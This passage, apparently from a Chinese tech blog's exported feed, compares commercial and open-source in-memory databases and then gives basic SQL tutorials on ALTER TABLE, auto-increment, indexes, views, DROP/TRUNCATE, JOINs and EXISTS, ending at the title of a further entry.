<p>传统的数据库管理系统把所有数据都放在磁盘上进行管理，所以称做磁盘数据库（DRDB:Disk-Resident Database）。磁盘数据库需要频繁地访问磁盘来进行数据的操作，由于对磁盘读写数据的操作一方面要进行磁头的机械移动，另一方面受到系统调用（通常通过CPU中断完成，受到CPU时钟周期的制约）时间的影响，当数据量很大，操作频繁且复杂时，就会暴露出很多问题。</p>
<p>近年来，内存容量不断提高，价格不断下跌，操作系统已经可以支持更大的地址空间（计算机进入了64位时代），同时对数据库系统实时响应能力要求日益提高，充分利用内存技术提升数据库性能成为一个热点。</p>
<p>?在数据库技术中，目前主要有两种方法来使用大量的内存。一种是在传统的数据库中，增大缓冲池，将一个事务所涉及的数据都放在缓冲池中，组织成相应的数据结构来进行查询和更新处理，也就是常说的共享内存技术，这种方法优化的主要目标是最小化磁盘访问。另一种就是内存数据库(MMDB:Main Memory Database，也叫主存数据库)技术，就是干脆重新设计一种数据库管理系统，对查询处理、并发控制与恢复的算法和数据结构进行重新设计，以更有效地使用CPU周期和内存，这种技术近乎把整个数据库放进内存中，因而会产生一些根本性的变化。</p>
<p>内存数据库系统带来的优越性能不仅仅在于对内存读写比对磁盘读写快上，更重要的是，从根本上抛弃了磁盘数据管理的许多传统方式，基于全部数据都在内存中管理进行了新的体系结构的设计，并且在数据缓存、快速算法、并行操作方面也进行了相应的改进，从而使数据处理速度一般比传统数据库的数据处理速度快很多，一般都在10倍以上，理想情况甚至可以达到1000倍。</p>
<p>Oracle TimesTen</p>
<p>不开源，商业使用付费</p>
<p>1. 符合RDBMS标准的独立内存数据库服务。</p>
<p>2.支持SQL访问，支持ODBC&amp;JDBC。</p>
<p>3.本身不支持与非Oracle数据库的互操作。</p>
<p>4.高可靠性，支持完整日志，支持镜像复制功能。</p>
<p>5.目前不支持存储过程和触发器。</p>
<p>6.内存结构简单，并没有数据库缓冲区、保存池或丢弃池的概念。</p>
<p>7.目前支持散列索引和T树索引，前者仅支持余键-值查找，速度非常快，执行过程与底层表的数量无关，具有较高的读取扩展性和很好的并发性；T树索引读取效率很高，但是，在繁重写操作时，并发性较差。</p>
<p>ASE-IMDB</p>
<p>不开源、商业使用付费</p>
<p>1.被整合到Sysbase ASE平台中（TimesTen则为一个独立的数据库）。</p>
<p>2. 基于经典ASE数据库模板创建。</p>
<p>3. 采用复制技术实现读取其他数据源的数据。</p>
<p>4. 完全支持ASE本身的SQL语法、安全性和加密。</p>
<p>IBM SolidDB</p>
<p>不开源、商业使用付费</p>
<p>1.可以提供超快的速度和超高的可用性，可以提供每秒数万至数十万事务的吞吐率，并且始终可以获得微秒级的响应时间。</p>
<p>2.抛弃大数据块结构，表行和索引节点独立地存储在内存中，可以直接添加索引，而不必重新组织大块结构。</p>
<p>3.放弃使用大块索引，以精简结构、增加索引层数、将索引节点最小化，从而避免节点内处理的成本。</p>
<p>4.使用一种称作trie（前缀树）的索引方式，更适合现代处理器缓存，通过有效促进缓存的使用来提高处理器的效率，从而实现性能的最大化。</p>
<p>5.使用一种获得专利的检查点方法来加快数据处理，查询事务的延时通常是10到20微秒，更新事务的延时通常小于100微秒。</p>
<p>VoltDB</p>
<p>开源版本免费 商业版本需付费</p>
<p>1.基于存储过程的事务提交方式：用户通过写存储过程完成应用程序的逻辑，作为一个先置条件将存储过程提交到VoltDB，运行时，用户程序调用存储过程完成事务操作，所有事务的运行逻辑是由VoltDB在服务器进程中完成。</p>
<p>2．基于Shared<br>Nothing结构的数据分布，整个数据库的数据分散到集群的多台机器上。</p>
<p>3.基于哈希的数据分布策略，好处是数据分散的均匀，没有动态数据调整的烦恼；缺点是新增的机器需要停止服务后重新分布数据。哈希方法打乱了数据的连续性，使得VoltDB对于范围查询的处理能力显著下降。</p>
<p>4.其事务并发控制需要依赖于集群内所有机器的时间一致，其数据分片规模是按照集群核数来划分，当整个系统压力比较大时，可以使事务的时延有效降低。</p>
<p>eXtremeDB</p>
<p>不开源的商业数据库，<br>测试版本在功能上与正式版没有区别，但是，对连接次数做了限制</p>
<p>1.高性能和高效的存储效率，为了提高性能方便程序使用，eXtremeDB中的数据未做任何压缩。</p>
<p>2.不仅开源建立完全运行在主内存的内存数据库，更可以建立磁盘&#x2F;内存混合介质的数据库。</p>
<p>3.嵌入式数据库：其内核以链接库的形式包含在应用程序之中，开销只有50KB-130KB；避免了进程间的通信，从而剔除了进程间通信的开销和不确定性；其独特的数据格式方便程序直接使用，剔除了数据复制及数据翻译的开销，缩短了应用程序的代码执行路径。</p>
<p>4.由应用定制的API，应用程序对eXtremeDB数据库的操作接口是根据应用数据库设计而自动产生，剔除了通用接口所必不可少的动态内存分配。</p>
<p>5.其独特的体系结构，保证了数据管理的可预测性。</p>
<p>SQLite</p>
<p>开源，免费使用 商业目的的分发版免费</p>
<p>1.需要专业支持则需要购买。</p>
<ol start="2">
<li>在并发（包括多进程和多线程）读写方面的性能一直不太理想。数据库可能会被写操作独占，从而导致其它读写操作阻塞或出错。</li>
</ol>
<p>3.32\64位主流操作系统均支持。</p>
<p>4.不支持ODBC连接，需通过第三方驱动支持JDBC连接。</p>
<p>5.支持SQL</p>
<p>H2</p>
<p>开源，免费使用 商业目的的分发版免费</p>
<p>1.需要专业支持则需要购买。</p>
<ol start="2">
<li>并发性较好（在模拟器中有使用，支持50个并发查询没问题），数据量少的情况，查询速度很好。</li>
</ol>
<p>3.32\64位主流操作系统均支持，但需Java平台支持。</p>
<p>4.支持ODBC&amp;JDBC</p>
<p>5.支持SQL</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL ALTER TABLE 语句</title>
    <url>/blog/database/sql/altertable/</url>
    <content><![CDATA[<p>ALTER TABLE 语句用于在已有的表中添加、修改或删除列。</p>
<p>SQL ALTER TABLE 语法</p>
<p>如需在表中添加列，请使用下列语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name </span><br><span class="line">ADD column_name datatype</span><br></pre></td></tr></table></figure>

<p>要删除表中的列，请使用下列语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line"> DROP COLUMN column_name</span><br></pre></td></tr></table></figure>

<p>注释：某些数据库系统不允许这种在数据库表中删除列的方式 (DROP COLUMN<br>column_name)。</p>
<p>要改变表中列的数据类型，请使用下列语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ALTER COLUMN column_name datatype</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL AUTO INCREMENT 字段</title>
    <url>/blog/database/sql/autoincrement/</url>
    <content><![CDATA[<p>Auto-increment 会在新记录插入表中时生成一个唯一的数字。</p>
<p>我们通常希望在每次插入新记录时，自动地创建主键字段的值。</p>
<p>我们可以在表中创建一个 auto-increment 字段。</p>
<h3 id="用于-MySQL-的语法"><a href="#用于-MySQL-的语法" class="headerlink" title="用于 MySQL 的语法"></a>用于 MySQL 的语法</h3><p>下列 SQL 语句把 “Persons” 表中的 “P_Id” 列定义为 auto-increment 主键：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL AUTO_INCREMENT,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MySQL 使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要让 AUTO_INCREMENT 序列以其他的值起始，请使用下列 SQL 语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons AUTO_INCREMENT=100</span><br></pre></td></tr></table></figure>

<p>要在 “Persons” 表中插入新记录，我们不必为 “P_Id”<br>列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES (&#x27;Bill&#x27;,&#x27;Gates&#x27;)</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”P_Id”<br>会被赋予一个唯一的值。”FirstName” 会被设置为 “Bill”，”LastName”<br>列会被设置为 “Gates”。</p>
<h3 id="用于-SQL-Server-的语法"><a href="#用于-SQL-Server-的语法" class="headerlink" title="用于 SQL Server 的语法"></a>用于 SQL Server 的语法</h3><p>下列 SQL 语句把 “Persons” 表中的 “P_Id” 列定义为 auto-increment 主键：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int PRIMARY KEY IDENTITY,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS SQL 使用 IDENTITY 关键字来执行 auto-increment 任务。</p>
<p>默认地，IDENTITY 的开始值是 1，每条新记录递增 1。</p>
<p>要规定 “P_Id” 列以 20 起始且递增 10，请把 identity 改为 IDENTITY(20,10)</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “P_Id”<br>列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES (&#x27;Bill&#x27;,&#x27;Gates&#x27;)</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”P_Id”<br>会被赋予一个唯一的值。”FirstName” 会被设置为 “Bill”，”LastName”<br>列会被设置为 “Gates”。</p>
<h3 id="用于-Access-的语法"><a href="#用于-Access-的语法" class="headerlink" title="用于 Access 的语法"></a>用于 Access 的语法</h3><p>下列 SQL 语句把 “Persons” 表中的 “P_Id” 列定义为 auto-increment 主键：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS Access 使用 AUTOINCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTOINCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要规定 “P_Id” 列以 20 起始且递增 10，请把 autoincrement 改为<br>AUTOINCREMENT(20,10)</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “P_Id”<br>列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (FirstName,LastName)</span><br><span class="line">VALUES (&#x27;Bill&#x27;,&#x27;Gates&#x27;)</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”P_Id”<br>会被赋予一个唯一的值。”FirstName” 会被设置为 “Bill”，”LastName”<br>列会被设置为 “Gates”。</p>
<h3 id="用于-Oracle-的语法"><a href="#用于-Oracle-的语法" class="headerlink" title="用于 Oracle 的语法"></a>用于 Oracle 的语法</h3><p>在 Oracle 中，代码稍微复杂一点。</p>
<p>您必须通过 sequence 对创建 auto-increment 字段（该对象生成数字序列）。</p>
<p>请使用下面的 CREATE SEQUENCE 语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE SEQUENCE seq_person</span><br><span class="line">MINVALUE 1</span><br><span class="line">START WITH 1</span><br><span class="line">INCREMENT BY 1</span><br><span class="line">CACHE 10</span><br></pre></td></tr></table></figure>

<p>上面的代码创建名为 seq_person 的序列对象，它以 1 起始且以 1<br>递增。该对象缓存 10 个值以提高性能。CACHE<br>选项规定了为了提高访问速度要存储多少个序列值。</p>
<p>要在 “Persons” 表中插入新记录，我们必须使用 nextval 函数（该函数从<br>seq_person 序列中取回下一个值）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Persons (P_Id,FirstName,LastName)</span><br><span class="line">VALUES (seq_person.nextval,&#x27;Lars&#x27;,&#x27;Monsen&#x27;)</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”P_Id” 的赋值是来自<br>seq_person 序列的下一个数字。”FirstName” 会被设置为 “Bill”，”LastName”<br>列会被设置为 “Gates”。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 创建索引 CREATE INDEX</title>
    <url>/blog/database/sql/createindex/</url>
    <content><![CDATA[<p>CREATE INDEX 语句用于在表中创建索引。</p>
<p>在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</p>
<p>您可以在表中创建索引，以便更加快速高效地查询数据。</p>
<p>用户无法看到索引，它们只能被用来加速搜索&#x2F;查询。</p>
<p>注释：更新一个包含索引的表需要比更新一个没有索引的表更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。</p>
<h4 id="SQL-CREATE-INDEX-语法"><a href="#SQL-CREATE-INDEX-语法" class="headerlink" title="SQL CREATE INDEX 语法"></a>SQL CREATE INDEX 语法</h4><p>在表上创建一个简单的索引。允许使用重复的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX index_name</span><br><span class="line">ON table_name (column_name)</span><br></pre></td></tr></table></figure>

<p>注释：”column_name” 规定需要索引的列。</p>
<h4 id="SQL-CREATE-UNIQUE-INDEX-语法"><a href="#SQL-CREATE-UNIQUE-INDEX-语法" class="headerlink" title="SQL CREATE UNIQUE INDEX 语法"></a>SQL CREATE UNIQUE INDEX 语法</h4><p>在表上创建一个唯一的索引。唯一的索引意味着两个行不能拥有相同的索引值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE UNIQUE INDEX index_name</span><br><span class="line">ON table_name (column_name)</span><br></pre></td></tr></table></figure>

<h4 id="CREATE-INDEX-实例"><a href="#CREATE-INDEX-实例" class="headerlink" title="CREATE INDEX 实例"></a>CREATE INDEX 实例</h4><p>本例会创建一个简单的索引，名为 “PersonIndex”，在 Person 表的 LastName<br>列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX PersonIndex</span><br><span class="line">ON Person (LastName)</span><br></pre></td></tr></table></figure>

<p>如果您希望以<em>降序</em>索引某个列中的值，您可以在列名称之后添加保留字<br><em>DESC</em>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX PersonIndex</span><br><span class="line">ON Person (LastName DESC)</span><br></pre></td></tr></table></figure>

<p>假如您希望索引不止一个列，您可以在括号中列出这些列的名称，用逗号隔开：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX PersonIndex</span><br><span class="line">ON Person (LastName, FirstName)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL CREATE VIEW 语法</title>
    <url>/blog/database/sql/createview/</url>
    <content><![CDATA[<h3 id="什么是视图？"><a href="#什么是视图？" class="headerlink" title="什么是视图？"></a>什么是视图？</h3><p>在 SQL 中，视图是基于 SQL 语句的结果集的可视化的表。</p>
<p>视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。我们可以向视图添加<br>SQL 函数、WHERE 以及 JOIN<br>语句，我们也可以提交数据，就像这些来自于某个单一的表。</p>
<p>注释：数据库的设计和结构不会受到视图中的函数、where 或 join 语句的影响。</p>
<h3 id="SQL-CREATE-VIEW-语法"><a href="#SQL-CREATE-VIEW-语法" class="headerlink" title="SQL CREATE VIEW 语法"></a>SQL CREATE VIEW 语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW view_name AS</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>

<p>注释：视图总是显示最近的数据。每当用户查询视图时，数据库引擎通过使用 SQL<br>语句来重建数据。</p>
<h3 id="SQL-CREATE-VIEW-实例"><a href="#SQL-CREATE-VIEW-实例" class="headerlink" title="SQL CREATE VIEW 实例"></a>SQL CREATE VIEW 实例</h3><p>可以从某个查询内部、某个存储过程内部，或者从另一个视图内部来使用视图。通过向视图添加函数、join<br>等等，我们可以向用户精确地提交我们希望提交的数据。</p>
<p>样本数据库 Northwind 拥有一些被默认安装的视图。视图 “Current Product<br>List” 会从 Products 表列出所有正在使用的产品。这个视图使用下列 SQL<br>创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Current Product List] AS</span><br><span class="line">SELECT ProductID,ProductName</span><br><span class="line">FROM Products</span><br><span class="line">WHERE Discontinued=No</span><br></pre></td></tr></table></figure>

<p>我们可以查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Current Product List]</span><br></pre></td></tr></table></figure>

<p>Northwind 样本数据库的另一个视图会选取 Products<br>表中所有单位价格高于平均单位价格的产品：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Products Above Average Price] AS</span><br><span class="line">SELECT ProductName,UnitPrice</span><br><span class="line">FROM Products</span><br><span class="line">WHERE UnitPrice&gt;(SELECT AVG(UnitPrice) FROM Products)</span><br></pre></td></tr></table></figure>

<p>我们可以像这样查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Products Above Average Price]</span><br></pre></td></tr></table></figure>

<p>另一个来自 Northwind 数据库的视图实例会计算在 1997<br>年每个种类的销售总数。请注意，这个视图会从另一个名为 “Product Sales for<br>1997″ 的视图那里选取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Category Sales For 1997] AS</span><br><span class="line">SELECT DISTINCT CategoryName,Sum(ProductSales) AS CategorySales</span><br><span class="line">FROM [Product Sales for 1997]</span><br><span class="line">GROUP BY CategoryName</span><br></pre></td></tr></table></figure>

<p>我们可以像这样查询上面这个视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Category Sales For 1997]</span><br></pre></td></tr></table></figure>

<p>我们也可以向查询添加条件。现在，我们仅仅需要查看 “Beverages”<br>类的全部销量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM [Category Sales For 1997]</span><br><span class="line">WHERE CategoryName=&#x27;Beverages&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-更新视图"><a href="#SQL-更新视图" class="headerlink" title="SQL 更新视图"></a>SQL 更新视图</h3><p>您可以使用下面的语法来更新视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL CREATE OR REPLACE VIEW Syntax</span><br><span class="line">CREATE OR REPLACE VIEW view_name AS</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>

<p>现在，我们希望向 “Current Product List” 视图添加 “Category”<br>列。我们将通过下列 SQL 更新视图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE VIEW [Current Product List] AS</span><br><span class="line">SELECT ProductID,ProductName,Category</span><br><span class="line">FROM Products</span><br><span class="line">WHERE Discontinued=No</span><br></pre></td></tr></table></figure>

<h3 id="SQL-撤销视图"><a href="#SQL-撤销视图" class="headerlink" title="SQL 撤销视图"></a>SQL 撤销视图</h3><p>您可以通过 DROP VIEW 命令来删除视图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP VIEW view_name</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL DROP 语句</title>
    <url>/blog/database/sql/drop/</url>
    <content><![CDATA[<p>通过使用 DROP 语句，可以轻松地删除索引、表和数据库。</p>
<h3 id="SQL-DROP-INDEX-语句"><a href="#SQL-DROP-INDEX-语句" class="headerlink" title="SQL DROP INDEX 语句"></a>SQL DROP INDEX 语句</h3><p>我们可以使用 DROP INDEX 命令删除表格中的索引。</p>
<p>用于 Microsoft SQLJet (以及 Microsoft Access) 的语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP INDEX index_name ON table_name</span><br></pre></td></tr></table></figure>

<p>用于 MS SQL Server 的语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP INDEX table_name.index_name</span><br></pre></td></tr></table></figure>

<p>用于 IBM DB2 和 Oracle 语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP INDEX index_name</span><br></pre></td></tr></table></figure>

<p>用于 MySQL 的语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name DROP INDEX index_name</span><br></pre></td></tr></table></figure>

<h3 id="SQL-DROP-TABLE-语句"><a href="#SQL-DROP-TABLE-语句" class="headerlink" title="SQL DROP TABLE 语句"></a>SQL DROP TABLE 语句</h3><p>DROP TABLE 语句用于删除表（表的结构、属性以及索引也会被删除）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE 表名称</span><br></pre></td></tr></table></figure>

<h3 id="SQL-DROP-DATABASE-语句"><a href="#SQL-DROP-DATABASE-语句" class="headerlink" title="SQL DROP DATABASE 语句"></a>SQL DROP DATABASE 语句</h3><p>DROP DATABASE 语句用于删除数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE 数据库名称</span><br></pre></td></tr></table></figure>

<h3 id="SQL-TRUNCATE-TABLE-语句"><a href="#SQL-TRUNCATE-TABLE-语句" class="headerlink" title="SQL TRUNCATE TABLE 语句"></a>SQL TRUNCATE TABLE 语句</h3><p>如果我们仅仅需要除去表内的数据，但并不删除表本身，那么我们该如何做呢？</p>
<p>请使用 TRUNCATE TABLE 命令（仅仅删除表格中的数据）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE 表名称</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL JOIN详解</title>
    <url>/blog/database/sql/join/</url>
    <content><![CDATA[<p>SQL join 用于根据两个或多个表中的列之间的关系，从这些表中查询数据。</p>
<p>JOIN 类型，以及它们之间的差异。</p>
<ol>
<li>JOIN: 如果表中有至少一个匹配，则返回行</li>
<li>LEFT JOIN: 即使右表中没有匹配，也从左表返回所有的行</li>
<li>RIGHT JOIN: 即使左表中没有匹配，也从右表返回所有的行</li>
<li>FULL JOIN: 只要其中一个表中存在匹配，就返回行</li>
</ol>
<h3 id="引用两个表"><a href="#引用两个表" class="headerlink" title="引用两个表"></a>引用两个表</h3><p>我们可以通过引用两个表的方式，从两个表中获取数据，等同于INNER Join：</p>
<p>谁订购了产品，并且他们订购了什么产品？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo</span><br><span class="line">FROM Persons, Orders</span><br><span class="line">WHERE Persons.Id_P = Orders.Id_P</span><br></pre></td></tr></table></figure>

<h3 id="INNER-Join"><a href="#INNER-Join" class="headerlink" title="INNER Join"></a>INNER Join</h3><p>除了上面的方法，我们也可以使用关键词 JOIN 来从两个表中获取数据。</p>
<p>如果我们希望列出所有人的定购，可以使用下面的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo</span><br><span class="line">FROM Persons</span><br><span class="line">INNER JOIN Orders</span><br><span class="line">ON Persons.Id_P = Orders.Id_P</span><br><span class="line">ORDER BY Persons.LastName</span><br></pre></td></tr></table></figure>

<h3 id="LEFT-JOIN"><a href="#LEFT-JOIN" class="headerlink" title="LEFT JOIN"></a>LEFT JOIN</h3><p>LEFT JOIN 关键字会从左表 (table_name1) 那里返回所有的行，即使在右表<br>(table_name2) 中没有匹配的行。</p>
<p>LEFT JOIN 关键字语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name1</span><br><span class="line">LEFT JOIN table_name2 </span><br><span class="line">ON table_name1.column_name=table_name2.column_name</span><br></pre></td></tr></table></figure>

<p>注释：在某些数据库中， LEFT JOIN 称为 LEFT OUTER JOIN。</p>
<h3 id="RIGHT-JOIN"><a href="#RIGHT-JOIN" class="headerlink" title="RIGHT JOIN"></a>RIGHT JOIN</h3><p>RIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表<br>(table_name1) 中没有匹配的行。</p>
<p>RIGHT JOIN 关键字语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name1</span><br><span class="line">RIGHT JOIN table_name2 </span><br><span class="line">ON table_name1.column_name=table_name2.column_name</span><br></pre></td></tr></table></figure>

<p>注释：在某些数据库中， RIGHT JOIN 称为 RIGHT OUTER JOIN。</p>
<h3 id="FULL-JOIN"><a href="#FULL-JOIN" class="headerlink" title="FULL JOIN"></a>FULL JOIN</h3><p>只要其中某个表存在匹配，FULL JOIN 关键字就会返回行。</p>
<p>FULL JOIN 关键字语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name1</span><br><span class="line">FULL JOIN table_name2 </span><br><span class="line">ON table_name1.column_name=table_name2.column_name</span><br></pre></td></tr></table></figure>

<p>注释：在某些数据库中， FULL JOIN 称为 FULL OUTER JOIN。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL中EXISTS的用法</title>
    <url>/blog/database/sql/exists/</url>
    <content><![CDATA[<p>EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False<br>EXISTS 指定一个子查询，检测 行 的存在。</p>
<p>语法： EXISTS subquery</p>
<p>参数： subquery 是一个受限的 SELECT 语句 (不允许有 COMPUTE 子句和 INTO<br>关键字)。</p>
<p>结果类型： Boolean 如果子查询包含行，则返回 TRUE ，否则返回 FLASE 。</p>
<p>（一）. 在子查询中使用 NULL 仍然返回结果集</p>
<p>select * from TableIn where exists(select null)</p>
<p>等同于： select * from TableIn</p>
<p>（二）. 比较使用 EXISTS 和 IN 的查询。注意两个查询返回相同的结果。</p>
<p>select * from TableIn where exists(select BID from TableEx where<br>BNAME&#x3D;TableIn.ANAME)</p>
<p>select * from TableIn where ANAME in(select BNAME from TableEx)</p>
<p>（三）. 比较使用 EXISTS 和 &#x3D; ANY 的查询。注意两个查询返回相同的结果。</p>
<p>select * from TableIn where exists(select BID from TableEx where<br>BNAME&#x3D;TableIn.ANAME)</p>
<p>select * from TableIn where ANAME&#x3D;ANY(select BNAME from TableEx)</p>
<p>NOT EXISTS 的作用与 EXISTS 正好相反。如果子查询没有返回行，则满足了 NOT<br>EXISTS 中的 WHERE 子句。</p>
<p>结论： EXISTS(包括 NOT EXISTS )子句的返回值是一个BOOL值。<br>EXISTS内部有一个子查询语句(SELECT … FROM…)，<br>我将其称为EXIST的内查询语句。其内查询语句返回一个结果集。<br><strong>EXISTS子句根据其内查询语句的结果集空或者非空，返回一个布尔值。</strong></p>
<p>一种通俗的可以理解为：将外查询表的每一行，代入内查询作为检验，如果内查询返回的结果取非空值，则EXISTS子句返回TRUE，这一行行可作为外查询的结果行，否则不能作为结果。</p>
<p>在插入记录前，需要检查这条记录是否已经存在，只有当记录不存在时才执行插入操作，可以通过使用<br>EXISTS 条件句防止插入重复记录。</p>
<p>INSERT INTO TableIn (ANAME,ASEX) SELECT top 1 ‘张三’, ‘男’ FROM TableIn<br>WHERE not exists (select * from TableIn where TableIn.AID &#x3D; 7)</p>
<p>EXISTS与IN的使用效率的问题，通常情况下采用exists要比in效率高，因为IN不走索引。</p>
<p><strong>但要看实际情况具体使用：<br>IN适合于外表大而内表小的情况；EXISTS适合于外表小而内表大的情况。</strong></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SELECT INTO 和 INSERT INTO SELECT 两种表复制语句</title>
    <url>/blog/database/sql/selectinto/</url>
